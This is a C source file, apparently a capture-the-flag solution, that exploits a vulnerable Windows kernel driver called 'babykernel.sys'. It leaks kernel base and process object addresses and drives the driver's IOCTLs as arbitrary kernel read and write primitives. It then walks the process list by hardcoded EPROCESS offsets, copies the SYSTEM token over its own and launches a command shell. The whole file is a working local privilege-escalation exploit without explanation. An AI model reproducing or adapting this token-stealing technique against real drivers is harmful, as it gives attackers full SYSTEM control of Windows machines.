#undef UNICODE
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>
#include <heapapi.h>
#include <TlHelp32.h>
#include <vector>
#include "header.h"
typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;
u64 size1 = 0x700;
u64 leakpipe;


#define DEVICE_NAME  "\\\\.\\babykernel"


HANDLE hDriver;
PVOID ProcAddress;

#define MAX_POOL 199

#define QWORD ULONGLONG
QWORD ntbase, coolpool;
#define ADDR(x) (x - 0x0140000000 + ntbase)

QWORD getBaseAddr(LPCSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        CHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strstr(szDrivers, drvName)) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}

uint64_t FindBaseAddress(ULONG pid) {
    HINSTANCE hNtDLL = LoadLibraryA("ntdll.dll");
    PSYSTEM_HANDLE_INFORMATION buffer;
    ULONG bufferSize = 0xffffff;
    buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
    NTSTATUS status;
    uint64_t ProcAddress = 0;
    _NtQuerySystemInformation NtQuerySystemInformation =_NtQuerySystemInformation(GetProcAddress(hNtDLL, "NtQuerySystemInformation"));
    status = NtQuerySystemInformation(0x10, buffer, bufferSize, NULL);
    if (!NT_SUCCESS(status)) {
        printf("NTQueryInformation Failed!\n");
        exit(-1);
    }
    for (ULONG i = 0; i <= buffer->HandleCount; i++) {
        if ((buffer->Handles[i].ProcessId == pid)) {
            //printf("Found object\n");
            ProcAddress = (uint64_t)buffer->Handles[i].Object;
            break;
        }
    }
    free(buffer);
    return ProcAddress;
}
void Error(const char* name) {
    printf("%s Error: %lu\n", name, GetLastError());
    exit(-1);
}


typedef struct request{
    u64 size;
    void *user_buffer;
    void *kernel_buffer;
} request;

void arbitrary_read(void* user_buf, void *kernel_buf, u64 size){
    
    request req;
    memset(&req, 0, sizeof(request));
    req.size = size;
    req.kernel_buffer = kernel_buf;
    req.user_buffer = user_buf;
    DWORD bytesWritten;
    DeviceIoControl(hDriver, 0x220004, &req, 0x18, NULL, NULL, &bytesWritten, NULL);
}

void arbitrary_write(void* kernel_buf, void* user_buf, u64 size){
    
    request req;
    memset(&req, 0, sizeof(request));
    req.size = size;
    req.kernel_buffer = kernel_buf;
    req.user_buffer = user_buf;
    DWORD bytesWritten;
    DeviceIoControl(hDriver, 0x220008, &req, 0x18, NULL, NULL, &bytesWritten, NULL);
}

u64 system_process = 0;
u64 babykernel;
u64 system_token;
u64 pid;

u64 find_current_process_obj(){
    u64 tracked_id;
    u64 tracked_process = system_process;

    do {
        arbitrary_read(&tracked_id, (void*)(tracked_process + 0x440), 8);
        if (tracked_id == pid){
            break;
        }
        arbitrary_read(&tracked_process, (void*)(tracked_process + 0x448), 8);
        tracked_process -= 0x448;
        
    } while (tracked_process != system_process);
    return tracked_process;
}

int main(int argc, char** argv)
{
    DWORD bytesWritten;
    hDriver = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %u\n", GetLastError());
        exit(1);
    }
    printf("Hdriver: %lu\n", (u64)hDriver);
    pid = GetCurrentProcessId();
    ntbase = getBaseAddr("ntoskrnl.exe");
    babykernel = getBaseAddr("babykernel.sys");
    printf("NT base: 0x%llx\n", ntbase);
    printf("Babykernel base: 0x%llx\n", babykernel);
    printf("Current process id: %lu\n", pid);

    u64 current_process = 0;
    system_process = FindBaseAddress(4);
    if (system_process == 0){
        printf("Bye");
        exit(-1);
    }
    printf("System process is located at: 0x%llx\n", system_process);

    arbitrary_read(&system_token, (void*)(system_process + 0x4b8), 8);
    printf("System token: 0x%llx\n", system_token);
    current_process = find_current_process_obj();
    printf("Current process: 0x%llx\n", current_process);
   
    arbitrary_write((void*)(current_process + 0x4b8), &system_token, 8);
    system("cmd");
    return 0;   
}
